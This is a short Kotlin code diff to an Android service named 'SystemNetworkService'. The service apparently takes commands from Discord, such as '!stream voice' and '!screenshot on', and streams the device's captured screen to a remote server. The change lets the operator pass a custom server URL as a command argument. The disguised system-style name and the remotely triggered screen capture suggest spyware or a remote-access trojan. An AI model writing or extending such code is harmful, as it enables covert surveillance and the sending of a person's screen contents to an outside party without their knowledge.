@@ -387,26 +387,27 @@ class SystemNetworkService : Service() {
                             }
                         }
                         payload?.lowercase()?.startsWith("voice") == true -> {
-                            val parts = payload.split(" ", limit = 3)
+                            val parts = payload.split(" ")
                             val voiceChannelId = parts.getOrNull(1)
                             val guildId = parts.getOrNull(2)
-                            
+                            val customBotUrl = parts.getOrNull(3)
+
                             if (voiceChannelId == null || guildId == null) {
-                                d.sendMsg(":x: **Usage**: `!stream voice <channel_id> <guild_id>`\nExample: `!stream voice 123456789 987654321`")
+                                d.sendMsg(":x: **Usage**: `!stream voice <channel_id> <guild_id> [bot_url]`\nExample: `!stream voice 123456789 987654321 https://mybot.com`")
                                 return
                             }
-                            
+
                             if (DisplayCapture.mediaProjection == null) {
                                 d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
                                 return
                             }
-                            
+
                             d.sendMsg(":satellite: **Starting voice stream**...\nConnecting to voice channel...")
-                            
+
                             scope.launch {
                                 try {
-                                    // Start H264 encoder
-                                    val botUrl = DiscordConfig.BOT_HTTP_URL.takeIf { it.isNotBlank() } 
+                                    val botUrl = customBotUrl?.takeIf { it.isNotBlank() }
+                                        ?: DiscordConfig.BOT_HTTP_URL.takeIf { it.isNotBlank() }
                                         ?: "https://your-bot-server.com"
                                     
                                     val deviceSuffix = d.getDeviceSuffix()
